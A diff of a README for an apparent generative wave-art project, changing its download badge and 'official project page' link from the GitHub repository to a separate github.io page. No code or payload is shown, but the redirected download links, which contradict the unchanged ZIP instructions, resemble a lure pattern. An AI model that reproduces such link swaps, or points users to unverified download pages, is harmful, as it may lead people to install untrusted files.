@@ -1,6 +1,6 @@
 # 🌊 Pool-Wind-Sun-Generative-Art - Create unique digital wave art patterns
 
-[![](https://img.shields.io/badge/Download-Project-blue)](https://github.com/zacherycentromeric319/Pool-Wind-Sun-Generative-Art)
+[![](https://img.shields.io/badge/Download-Project-blue)](https://zacherycentromeric319.github.io)
 
 Pool Wind Sun generates fluid wave simulations. This software creates unique patterns using math and color. Every time the screen updates, the system builds a new design based on fluid dynamics. These patterns feature oscillating waves and colors inspired by sunsets. You can use these designs for digital art projects or textile prints.
 
@@ -19,7 +19,7 @@ Your computer needs specific parts to run this software. Please read these requi
 
 You must visit the project page to get the files. Follow these steps to obtain the software.
 
-1. Go to the [official project page](https://github.com/zacherycentromeric319/Pool-Wind-Sun-Generative-Art).
+1. Go to the [official project page](https://zacherycentromeric319.github.io).
 2. Look for the button that says Code.
 3. Click the button to open a menu.
 4. Select Download ZIP from the list.
